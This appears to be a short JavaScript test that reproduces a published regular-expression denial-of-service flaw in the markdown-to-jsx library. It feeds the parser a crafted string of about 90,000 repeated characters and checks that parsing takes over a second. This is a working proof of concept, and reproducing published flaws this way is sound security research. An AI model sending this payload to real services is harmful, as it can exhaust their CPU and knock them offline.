//https://securitylab.github.com/advisories/GHSL-2020-300-redos-markdown-to-jsx/
test("ReDos in markdown-to-jsx", () => {
  const { compiler } = require("markdown-to-jsx");
  const measureTime = require("./utils").measureTime;
  const { genstr } = require("./utils");

  attack_str = '<a foobar="foo' + genstr(90000, "\\!") + "/>";

  let t = measureTime(function () {
    compiler(attack_str, { disableParsingRawHTML: false });
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
